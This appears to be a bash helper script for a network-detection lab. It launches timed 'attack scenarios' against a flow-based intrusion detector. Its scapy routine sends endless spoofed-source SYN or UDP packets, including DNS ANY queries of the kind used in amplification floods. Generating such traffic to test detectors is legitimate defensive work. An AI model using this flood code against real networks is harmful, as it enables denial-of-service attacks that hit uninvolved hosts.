#!/bin/bash
# Shared helpers for the attack scenarios.

DURATION="${DURATION:-600}"

pids=()

launch() {
  local label=$1; shift
  echo "  launching ${label}: $*"
  "$@" >/dev/null 2>&1 &
  pids+=($!)
}

stop_all() {
  for pid in "${pids[@]}"; do kill "$pid" 2>/dev/null || true; done
}

finish() {
  echo "running for ${DURATION}s..."
  sleep "${DURATION}"
  echo "stopping"
  stop_all
  wait 2>/dev/null || true
  echo "done"
}

need() {
  command -v "$1" >/dev/null || {
    echo "missing $1 - run attacks/install-tools.sh" >&2
    exit 1
  }
}

# A --flood walks the source port space, so each 5-tuple can end up carrying a
# single packet, and CICFlowMeter drops flows of one packet. This stream repeats
# a bounded set of ports instead, so the spoofed source reaches the detector.
launch_spoofed_flows() {
  local src=$1 dst=$2 dport=$3 proto=${4:-udp} zone=${5:-cyberstuff.local}
  if ! python3 -c "import scapy" 2>/dev/null; then
    echo "  scapy absent, skipping the spoofed flow stream"
    return 0
  fi
  launch "spoofed ${proto} flows from ${src}" python3 -c "
from scapy.all import IP, TCP, UDP, DNS, DNSQR, send

def build(port):
    ip = IP(src='${src}', dst='${dst}')
    if '${proto}' == 'tcp':
        return ip / TCP(sport=port, dport=${dport}, flags='S')
    pkt = ip / UDP(sport=port, dport=${dport})
    if ${dport} == 53:
        pkt = pkt / DNS(rd=1, qd=DNSQR(qname='${zone}', qtype='ANY'))
    return pkt

while True:
    for port in range(40000, 40064):
        send([build(port)] * 6, verbose=0)
"
}

trap 'stop_all' INT TERM
